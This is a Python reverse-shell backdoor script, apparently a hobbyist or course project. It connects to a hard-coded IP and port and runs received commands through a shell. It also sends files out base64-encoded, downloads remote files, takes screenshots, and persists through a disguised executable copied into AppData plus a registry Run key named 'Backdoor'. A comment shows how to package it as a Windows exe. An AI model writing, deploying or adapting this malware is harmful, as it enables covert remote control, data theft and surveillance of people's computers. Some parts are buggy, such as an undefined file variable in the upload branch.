#!/usr/bin/python

import socket
import subprocess
import json
import os
import base64
import shutil
import sys
import time
import requests
from mss import mss

def screenshoot():
	with  mss() as screenshot:
		screenshot.shot()

def downlaod(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name,"wb") as out_file:
		out_file.write(get_response.content)


def relibale_send(data):
	try:
		json_data = json.dumps(data.decode('utf-8'))
		sock.send(bytes(json_data.encode('utf-8')))
	except Exception as e:
		print("Exception hile sending message")
		print(e)

def reliable_recv():
	data = ""
	while True:
		try :
			data = data + str(sock.recv(1024).decode("utf-8"))
			return json.loads(data)
		except ValueError:
			continue


def connection():
	while True:
		time.sleep(20)
		try:
			sock.connect(("192.168.0.21", 54321))
			shell()
		except:
			connection()
def shell():
	while True:
		command = reliable_recv()
		if command == 'q':
			break
		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue
		
		elif command[:8] == "download":
			with open(command[9:], "rb") as file:
				relibale_send(base64.b64encode(file.read()))
		elif command[:6] == "upload":
			try:
				with open(command[7:], "wb") as fin:
					file_data = reliable_recv()
					file.write(base64.b64decode(file_data))
			except Exception as e: 
				print(e)
		elif command[:3] == "get":
			try:
				downlaod(command[4:])
				relibale_send("send + Donwloaded file from sepeicifed url".encode('utf-8'))
			except Exception as e:
				print(e)
				relibale_send("failed to dowload".encode('utf-8'))
		elif command[:10] == "screenshot":
			try:
				screenshoot()
				with open("monitor-1.png", "rb") as sc:
					relibale_send(base64.b64encode(sc.read()))
				os.remove("monitor-1.png")
			except Exception as e:
				print(e)
				relibale_send("[!!] Failed to take screenshoot. ")
		
		else:
			try:
				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
				result = proc.stdout.read() + proc.stderr.read()
				relibale_send(result)
			except Exception as e:
				print(e)

location = os.environ["appdata"] + "\\Avinashwindows32.exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable, location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + "'", shell=True)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
###sock.connect(("192.168.0.21", 54321))
connection()
###shell()
## Command used to genertae exe
##wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile reverseShell.py 
sock.close()


